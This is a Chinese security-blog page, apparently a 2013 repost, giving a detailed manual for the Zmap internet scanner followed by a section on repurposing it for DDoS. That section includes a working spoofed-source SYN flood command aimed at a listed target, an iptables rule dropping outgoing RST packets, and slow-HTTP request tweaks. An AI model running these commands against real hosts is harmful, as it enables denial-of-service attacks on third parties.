@@ -1,0 +1,1149 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Zmap详细用户手册和DDOS的可行性 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="livers" /><meta name="description" content="Zmap详细用户手册和DDOS的可行性。0x00 背景。Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）。Debian/Ubuntu 系列。Fedora, Red Hat Enterprise Linux, or CentOS版本：只把step2替换成。如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中" />
+<meta name="keywords" content="Zmap详细用户手册和DDOS的可行性" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3892/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="Zmap详细用户手册和DDOS的可行性" />
+<meta property="og:description" content="Zmap详细用户手册和DDOS的可行性。0x00 背景。Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）。Debian/Ubuntu 系列。Fedora, Red Hat Enterprise Linux, or CentOS版本：只把step2替换成。如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3892/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-09-18T10:06:42&#43;08:00" />
+<meta property="article:modified_time" content="2013-09-18T10:15:31&#43;08:00" />
+
+<meta itemprop="name" content="Zmap详细用户手册和DDOS的可行性">
+<meta itemprop="description" content="Zmap详细用户手册和DDOS的可行性。0x00 背景。Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）。Debian/Ubuntu 系列。Fedora, Red Hat Enterprise Linux, or CentOS版本：只把step2替换成。如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中"><meta itemprop="datePublished" content="2013-09-18T10:06:42&#43;08:00" />
+<meta itemprop="dateModified" content="2013-09-18T10:15:31&#43;08:00" />
+<meta itemprop="wordCount" content="3643">
+<meta itemprop="keywords" content="DDOS,Dos,HTTP,IP,MAC,POS,sock,SQL,测试,端口,流量,模块,扫描,数据,网络,文件,源码," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Zmap详细用户手册和DDOS的可行性"/>
+<meta name="twitter:description" content="Zmap详细用户手册和DDOS的可行性。0x00 背景。Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）。Debian/Ubuntu 系列。Fedora, Red Hat Enterprise Linux, or CentOS版本：只把step2替换成。如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">Zmap详细用户手册和DDOS的可行性</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-09-18" class="post-time">
+          2013-09-18
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/ddos/"> DDOS </a>
+            <a href="https://lcx.cc/categories/dos/"> Dos </a>
+            
+          </div>
+        <span class="more-meta"> 约 3643 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	<strong>0x00 背景</strong> 
+</p>
+<p style="text-indent:2em;">
+	Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。
+</p>
+<p style="text-indent:2em;">
+	<strong>安装：</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>64位版本</strong> 
+</p>
+<p style="text-indent:2em;">
+	Debian/Ubuntu 系列
+</p>
+<pre class="prettyprint">Step1: sudo apt-get install libgmp3-dev libpcap-dev gengetopt
+Step2: wget https://github.com/zmap/zmap/archive/v1.0.3.tar.gz
+Step3: tar –zxvf v1.0.3.tar.gz
+Step4: cd zmap-1.0.3/src
+Step5: make &amp;&amp; make install</pre>
+<p style="text-indent:2em;">
+	<strong>32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）</strong> 
+</p>
+<p style="text-indent:2em;">
+	Debian/Ubuntu 系列
+</p>
+<pre class="prettyprint">Step1: sudo apt-get install libgmp3-dev libpcap-dev gengetopt
+Step2: git clone git://github.com/zmap/zmap.git
+Step3: tar –zxvf v1.0.2.tar.gz
+Step4: cd zmap-1.0.2/src
+Step5: make &amp;&amp; make install</pre>
+<p style="text-indent:2em;">
+	Fedora, Red Hat Enterprise Linux, or CentOS版本：
+</p>
+<p style="text-indent:2em;">
+	只把step2替换成
+</p>
+<pre class="prettyprint">sudo yum install gmp gmp-devel libpcap-devel gengetopt</pre>
+<p style="text-indent:2em;">
+	如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中
+</p>
+<pre class="prettyprint">make REDIS=true   (加入此安装选项)</pre>
+<p style="text-indent:2em;">
+	不是以root权限运行则需要配置：
+</p>
+<pre class="prettyprint">setcap cap_net_raw=ep /usr/local/sbin/zmap</pre>
+<p style="text-indent:2em;">
+	<strong>0x01 使用介绍：</strong> 
+</p>
+<p style="text-indent:2em;">
+	安装完后，可直接调用zmap
+</p>
+<p style="text-indent:2em;">
+	<strong>1.最简单的调用</strong> 
+</p>
+<pre class="prettyprint">zmap -B 10M -p 80 -n 100000 -o results.txt</pre>
+<p style="text-indent:2em;">
+	-B 是指的是带宽 -p 端口 -n 扫描多少个目标 -o 输出结果
+</p>
+<p style="text-indent:2em;">
+	整句表示利用10M带宽扫描100000IP地址的端口，并将结果输出到results.txt中。
+</p>
+<p style="text-indent:2em;">
+	我BT5 R3 测试时，必须加入-G 参数
+</p>
+<pre class="prettyprint">zmap -B 10M -p 80 -n 100000 -G "01:00:5e:00:00:02" -o results.txt</pre>
+<p style="text-indent:2em;">
+	-G 是指定出口的mac地址，必须为网关的实际mac地址，否则返回数据找不到信息。
+</p>
+<p style="text-indent:2em;">
+	如果扫到IP地址开了80端口，就会按照下列格式进行保存。
+</p>
+<pre class="prettyprint">115.237.116.119
+23.9.117.80
+207.118.204.141
+217.120.143.111</pre>
+<p style="text-indent:2em;">
+	<strong>2.用的最多的指令</strong> 
+</p>
+<pre class="prettyprint">zmap -p 443 -G "00:00:00:00:00:00"</pre>
+<p style="text-indent:2em;">
+	检测全网络SSL/STL使用状况，ZMAP几个研究项目都与此有关。
+</p>
+<p style="text-indent:2em;">
+	<img title="检测全网络SSL/STL使用状况" alt="检测全网络SSL/STL使用状况" src="/file/old/3144_1.jpg" width="645" height="343" /> 
+</p>
+<p style="text-indent:2em;">
+	可见我使用的扫描全网的所得大约9小时16分钟，网络为10MADSL带宽，ADSL上行速度只有100k左右，导致时间加倍延迟。
+</p>
+<p style="text-indent:2em;">
+	<strong>3.常用参数</strong> 
+</p>
+<pre class="prettyprint">-p, --target-port=port</pre>
+<p style="text-indent:2em;">
+	指定扫描的目标端口
+</p>
+<pre class="prettyprint">-o, --output-file=name  </pre>
+<p style="text-indent:2em;">
+	把结果写入指定文件 -o result.txt
+</p>
+<pre class="prettyprint">-b, --blacklist-file=path  </pre>
+<p style="text-indent:2em;">
+	IP地址黑名单，例如192.168.0.0/16 表示 192.168.x.x将不被扫描，默认提供一份?RFC 1918保留和内网地址供参考，存放位置在conf/blacklist.conf
+</p>
+<pre class="prettyprint">zmap -p 443 -G "00:00:00:00:00:00" -b  conf/blacklist.conf
+
+
+
+
+
+-n, --max-targets=n</pre>
+<p style="text-indent:2em;">
+	最大扫描IP地址数量，-n 100 表示总归扫描100个IP地址。也可指定 –n 0.1%形式，表示扫描除去黑名单列表里面全网段的0.1%数量的IP地址。
+</p>
+<pre class="prettyprint">-N, --max-results=n</pre>
+<p style="text-indent:2em;">
+	最大扫描到结果的IP数量，-N 100 表示扫描到100个存在的结果就停止。
+</p>
+<pre class="prettyprint">-t, --max-runtime=secs</pre>
+<p style="text-indent:2em;">
+	最大扫描时间，-t 10 表示程序运行10s结束。
+</p>
+<pre class="prettyprint">-r, --rate=pps</pre>
+<p style="text-indent:2em;">
+	设置每秒发送包的数量 –r 10000 表示每秒发送10k个包。
+</p>
+<pre class="prettyprint">-B, --bandwidth=bps</pre>
+<p style="text-indent:2em;">
+	设置每秒发送包的大小，-B 10M 表示每秒发送10Mbps 支持单位（GMK）。
+</p>
+<pre class="prettyprint">-c, --cooldown-time=secs</pre>
+<p style="text-indent:2em;">
+	设置数据包发送完之后多长时间开始接受数据（response）,默认8s，TCP连接异步接受。
+</p>
+<pre class="prettyprint">-e, --seed=n</pre>
+<p style="text-indent:2em;">
+	设置扫描随机地址的顺序，C语言中的伪随机种子，指定 定值每次随机扫描的IP地址顺序是一样。
+</p>
+<pre class="prettyprint">-T, --sender-threads=n</pre>
+<p style="text-indent:2em;">
+	设置扫描线程。默认是1，经测试单线程基本是把网络带宽充分利用。
+</p>
+<pre class="prettyprint">-P, --probes=n</pre>
+<p style="text-indent:2em;">
+	设置往每个IP发送包的数量，默认为1。（DDOS的参数之一）。
+</p>
+<pre class="prettyprint">-d, --dryrun</pre>
+<p style="text-indent:2em;">
+	打印出每个包的内容，非常实用的功能。
+</p>
+<pre class="prettyprint">-s, --source-port=port|range</pre>
+<p style="text-indent:2em;">
+	设置扫描的源端口，可指定范围 –s 30000-50000。（DDOS的参数之一）。
+</p>
+<pre class="prettyprint">-S, --source-ip=ip|range</pre>
+<p style="text-indent:2em;">
+	设置扫描的源IP地址，可指定范围-S 100.100.0.1-200.200.200.200（DDOS的参数之一）。
+</p>
+<pre class="prettyprint">-G, --gateway-mac=addr</pre>
+<p style="text-indent:2em;">
+	设置网关的mac地址，可伪造。（DDOS的参数之一）
+</p>
+<pre class="prettyprint">-M, --probe-module=name</pre>
+<p style="text-indent:2em;">
+	设置扫描模式，参数tcp_synscan（默认），icmp_echoscan（ping扫描），udp（测试速度要逊于前两个），这里可自定义自己的模块，ZMAP作者后续会增加例如自定义UDP payload 的选项。（`*udp_send_msg = "GET / HTTP/1.1
+</p>
+<p style="text-indent:2em;">
+	"; // Must be null-terminated`）源码里不可直接更改 （1.0.3版本加入UDP Data Probes可进行自定义）
+</p>
+<pre class="prettyprint">-O, --output-module=name</pre>
+<p style="text-indent:2em;">
+	设置结果输出模块，参数simple_file（默认），extended_file。
+</p>
+<p style="text-indent:2em;">
+	Simple_file 模式如下
+</p>
+<pre class="prettyprint">115.237.116.119
+23.9.117.80
+207.118.204.141
+217.120.143.111</pre>
+<p style="text-indent:2em;">
+	Extended File模式如下
+</p>
+<pre class="prettyprint">response, saddr, daddr, sport, dport, seq, ack, in_cooldown, is_repeat, timestamp
+synack, 159.174.153.144, 10.0.0.9, 80, 40555, 3050964427, 3515084203, 0, 0,2013-08-15 18:55:47.681</pre>
+<p style="text-indent:2em;">
+	扫描模块和输出模块都提供了API ，可自己根据需要添加功能。
+</p>
+<pre class="prettyprint">--quiet</pre>
+<p style="text-indent:2em;">
+	安静状态下运行，不把进度信息打印到屏幕上
+</p>
+<pre class="prettyprint">--summary</pre>
+<p style="text-indent:2em;">
+	输出结果汇总，对研究人员来说 非常有帮助。
+</p>
+<p style="text-indent:2em;">
+	<strong>0x02 三个额外的扩展应用</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>Banner Grab</strong> 
+</p>
+<p style="text-indent:2em;">
+	抓取指纹，简言之抓取response 为识别类似SSH，http 401之类的信息做准备。
+</p>
+<p style="text-indent:2em;">
+	这里?examples?/?banner-grab 目录下
+</p>
+<p style="text-indent:2em;">
+	首先 make 生成banner-grab-tcp
+</p>
+<p style="text-indent:2em;">
+	向http-req 文件写入要发送的数据 (也可以自定义SSH-req 之类)
+</p>
+<p style="text-indent:2em;">
+	如：
+</p>
+<pre class="prettyprint">echo -e -n "GET / HTTP/1.1
+Host: %s
+
+" &gt; http-req</pre>
+<p style="text-indent:2em;">
+	（%s 保留，其他可任意构造HTTP请求，包括GET，POST）
+</p>
+<p style="text-indent:2em;">
+	这里扩展下 banner-grab-tcp下的参数
+</p>
+<pre class="prettyprint">-c, --concurent   每次的连接数，最好低于1000，想要高于1000则必须设置ulimit -SSn 1000000` and `ulimit -SHn 1000000` 突破每个文件最大进程数1024
+-p, --port      连接的端口
+-t, --conn-timeout  连接超时时间
+-r, --read-timeout  响应超时时间
+-v, --verbosity     列取信息详细程度 ，与sqlmap 类似
+-f, --format        输出文件格式hex，ascii，base64
+-d, --data      发送的数据信息 就是前面设置http-req</pre>
+<p style="text-indent:2em;">
+	源码里 #define MAX_BANNER_LEN 1024 接收的每条返回数据，只接收1024字节，根据需要可自行更改。
+</p>
+<p style="text-indent:2em;">
+	<strong>与zmap 联合使用</strong> 
+</p>
+<p style="text-indent:2em;">
+	例子
+</p>
+<pre class="prettyprint">zmap -p 80 -N 1000 -o - | ./banner-grab-tcp -p 80 -c 100 -d http-req &gt; http-banners.out</pre>
+<p style="text-indent:2em;">
+	zmap扫描1000个80端口开放的IP地址，banner-grab-tcp 来扫描这些IP地址，扫描请求内容通过http-req可自定义 .
+</p>
+<p style="text-indent:2em;">
+	<strong>forge-socket</strong> 
+</p>
+<p style="text-indent:2em;">
+	与Banner Grab功能一样，参数也类似，不再重复。
+</p>
+<p style="text-indent:2em;">
+	主要是安装方式不同
+</p>
+<p style="text-indent:2em;">
+	要先安装下列驱动
+</p>
+<pre class="prettyprint">git clone git@github.com:ewust/forge_socket.git
+cd forge_socket
+make
+sudo insmod forge_socket.ko（以底层驱动方式 比Banner Grab效率高一些）</pre>
+<p style="text-indent:2em;">
+	并且用iptables阻止发rst包
+</p>
+<pre class="prettyprint">iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST,RST RST,RST -j DROP</pre>
+<p style="text-indent:2em;">
+	<strong>UDP Data Probes</strong> 
+</p>
+<p style="text-indent:2em;">
+	1.03版本加入
+</p>
+<p style="text-indent:2em;">
+	详细的测试payload见
+</p>
+<p style="text-indent:2em;">
+	<a href="https://github.com/zmap/zmap/tree/master/examples/udp-probes" target="_blank">https://github.com/zmap/zmap/tree/master/examples/udp-probes</a> 
+</p>
+<p style="text-indent:2em;">
+	以探测mssql的1434端口为例：
+</p>
+<pre class="prettyprint">zmap -M udp -p 1434 --probe-args=file:examples/udp-probes/mssql_1434.pkt</pre>
+<p style="text-indent:2em;">
+	pkt也可自行构造。
+</p>
+<p style="text-indent:2em;">
+	格式化配置
+</p>
+<p style="text-indent:2em;">
+	利用配置文件 简化命令行输入
+</p>
+<pre class="prettyprint">interface "eth1"
+source-ip 1.1.1.4-1.1.1.8
+gateway-mac b4:23:f9:28:fa:2d # upstream gateway
+cooldown-time 300 # seconds
+blacklist-file /etc/zmap/blacklist.conf
+output-file ~/zmap-output
+quiet
+summary</pre>
+<p style="text-indent:2em;">
+	上述指令上面全部有介绍。
+</p>
+<p style="text-indent:2em;">
+	很显然，可以通过配置文件更快速配置zmap.
+</p>
+<p style="text-indent:2em;">
+	使用方法：
+</p>
+<pre class="prettyprint">zmap --config=~/.zmap.conf --target-port=443</pre>
+<p style="text-indent:2em;">
+	<strong>0x03 原理分析</strong> 
+</p>
+<p style="text-indent:2em;">
+	Know it
+</p>
+<p style="text-indent:2em;">
+	首先讲下TCP三次握手。
+</p>
+<p style="text-indent:2em;">
+	在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。
+</p>
+<p style="text-indent:2em;">
+	<img title="TCP三次握手" alt="TCP三次握手" src="/file/old/3145_2.jpg" width="323" height="187" /> 
+</p>
+<p style="text-indent:2em;">
+	可见三次握手存在于发送-应答-发送机制，等待监听的时间势必导致发包速度很慢。
+</p>
+<p style="text-indent:2em;">
+	这里zmap是发送SYN，随后发送RST（重置连接），不存在监听同步操作，清空连接，再继续发下一个数据包。 而对于识别 zmap把 Ip地址和端口做了类似hash表一样的映射，当数据包返回时（可能是Syn+Ack，也可能RST），取出返回数据包里Ip和端口地址进行储存的hash表里查询，并对应处理记录。 同步变异步高效的基本原因。
+</p>
+<p style="text-indent:2em;">
+	<strong>0x04 发散扩展</strong> 
+</p>
+<p style="text-indent:2em;">
+	DDoS的可行性：
+</p>
+<p style="text-indent:2em;">
+	作者旨在关注全网的扫描，并未提及相关DDoS 的信息。
+</p>
+<p style="text-indent:2em;">
+	也并未特别提供指向型发包的指令。
+</p>
+<p style="text-indent:2em;">
+	下面讨论可能与作者想法相违，希望各位重在技术钻研，而非一些恶意破坏。
+</p>
+<p style="text-indent:2em;">
+	指定ip段 和ip地址
+</p>
+<pre class="prettyprint">-w, --whitelist-file=path</pre>
+<p style="text-indent:2em;">
+	限制只扫描文件中的下列地址或者地址段，例如：
+</p>
+<pre class="prettyprint">222.222.221.82/24   （192.168.1.0-255 ）（可利用种子 –seed 调整从那个IP开始）</pre>
+<p style="text-indent:2em;">
+	单个Ip地址
+</p>
+<pre class="prettyprint">222.222.221.82/32  （随机找了一个，这里1.02版本测试不能直接，需要改 blacklist.c和constraint.c 中生成IP地址的二叉树的root节点一小部分代码）</pre>
+<p style="text-indent:2em;">
+	然后利用
+</p>
+<pre class="prettyprint">-P  10000000 （重复多次发包）
+-s  2000-60000 (设置一个大的端口段)
+-S  20.20.20.0-200.200.200.200（随机大量Ip地址，模拟分布式的D）
+-G  这个伪造mac （但是收不到数据包）
+
+
+
+
+
+Zmap –p 80 -P 10000000 -s 2000-60000 -S 20.20.20.0-200.200.200.200 -w attack_url.txt</pre>
+<p style="text-indent:2em;">
+	见下列发送的数据效果，达到预期
+</p>
+<p style="text-indent:2em;">
+	<img title="发送的数据效果" alt="发送的数据效果" src="/file/old/3146_3.jpg" width="599" height="557" /> 
+</p>
+<p style="text-indent:2em;">
+	可能造成什么样的危害?
+</p>
+<p style="text-indent:2em;">
+	可以配置IP Spoofing，syn flood,land attack, ICMP floods, Application floods 和其他UDP 全零等多种攻击。
+</p>
+<p style="text-indent:2em;">
+	Zmap 的发包速度甚至可以忽略一下 随后发的这个rst 包。
+</p>
+<p style="text-indent:2em;">
+	也可以做得完美一点就是利用iptables
+</p>
+<pre class="prettyprint">iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST,RST RST,RST -j DROP</pre>
+<p style="text-indent:2em;">
+	把发出去的RST包给drop掉。
+</p>
+<p style="text-indent:2em;">
+	<strong>可以再升一下？</strong> 
+</p>
+<p style="text-indent:2em;">
+	毕竟有部分扩展能控制到应用层也是可以进行慢攻击。
+</p>
+<p style="text-indent:2em;">
+	Get 类型
+</p>
+<pre class="prettyprint">echo -e -n "GET / HTTP/1.1
+Host: %s
+
+" &gt; http-req  替换成
+echo -e -n "GET / HTTP/1.1
+Host: %s
+ " &gt; http-req</pre>
+<p style="text-indent:2em;">
+	Post 类型
+</p>
+<p style="text-indent:2em;">
+	可以把源码sizeof(value) 的值设置一个大的动态数值。 Post数据设置很小。
+</p>
+<p style="text-indent:2em;">
+	<strong>DDoS 流量 +连接数 +畸形包</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>流量基本只能硬防，拼硬件。</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>zmap几乎是最大限度利用网络带宽，10台G口服务器不会损耗多少，如果再利用DNS放大流量之类，很恐怖的数字。</strong> 
+</p>
+<p style="text-indent:2em;">
+	Ps ：
+</p>
+<p style="text-indent:2em;">
+	Zmap 某些方面和python 的scapy很像。
+</p>
+<p style="text-indent:2em;">
+	但zmap 纯C实现，比scapy效率要高一些。
+</p>
+<p style="text-indent:2em;">
+	以前老是纠结scapy 随后发送RST 问题，这里利用iptables 方式确实是个好方法。
+</p>
+<p style="text-indent:2em;">
+	参考其中的源码和相对规范的API接口，编写一些模块可以玩出很多花样。
+</p>
+<p style="text-indent:2em;">
+	LINK:
+</p>
+<p style="text-indent:2em;">
+	<a href="https://zmap.io/documentation.html" target="_blank">https://zmap.io/documentation.html</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://github.com/zmap/" target="_blank">https://github.com/zmap/</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="http://drops.wooyun.org/tools/515" target="_blank">[原文地址]</a>
+</p>
+<p>
+	<strong>相关讨论：</strong>
+</p>
+<p style="text-indent:2em;">
+	园长 | 2013/08/23 11:53 | #
+</p>
+<p style="text-indent:2em;">
+	吃完饭再回来看。
+</p>
+<p style="text-indent:2em;">
+	国士无双 | 2013/08/23 11:54 | #
+</p>
+<p style="text-indent:2em;">
+	先去吃饭...
+</p>
+<p style="text-indent:2em;">
+	erevus | 2013/08/23 12:11 | #
+</p>
+<p style="text-indent:2em;">
+	在公司不敢测，怕被搞死...回家玩
+</p>
+<p style="text-indent:2em;">
+	xsser | 2013/08/23 12:16 | #
+</p>
+<p style="text-indent:2em;">
+	ddos部分貌似还是比不上专业的ddos工具
+</p>
+<p style="text-indent:2em;">
+	livers | 2013/08/23 12:41 | #
+</p>
+<p style="text-indent:2em;">
+	基本占满网速了，缺点是在于现成不太方便
+</p>
+<p style="text-indent:2em;">
+	liyang | 2013/08/23 12:37 | #
+</p>
+<p style="text-indent:2em;">
+	今天安装的时候 最后make install要权限的
+</p>
+<p style="text-indent:2em;">
+	sudo make install
+</p>
+<p style="text-indent:2em;">
+	Jannock | 2013/08/23 12:39 | #
+</p>
+<p style="text-indent:2em;">
+	zmap只管发包，所以目标越大回应的越多，他就越是快。
+</p>
+<p style="text-indent:2em;">
+	livers | 2013/08/23 12:43 | #
+</p>
+<p style="text-indent:2em;">
+	对的，发包和收包异步进行 速度杠杠的
+</p>
+<p style="text-indent:2em;">
+	SunnyJay | 2013/08/23 18:31 | #
+</p>
+<p style="text-indent:2em;">
+	看起来很火啊~
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">livers</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2013-09-18
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/ddos/">DDOS</a>
+          <a href="https://lcx.cc/tags/dos/">Dos</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/mac/">MAC</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
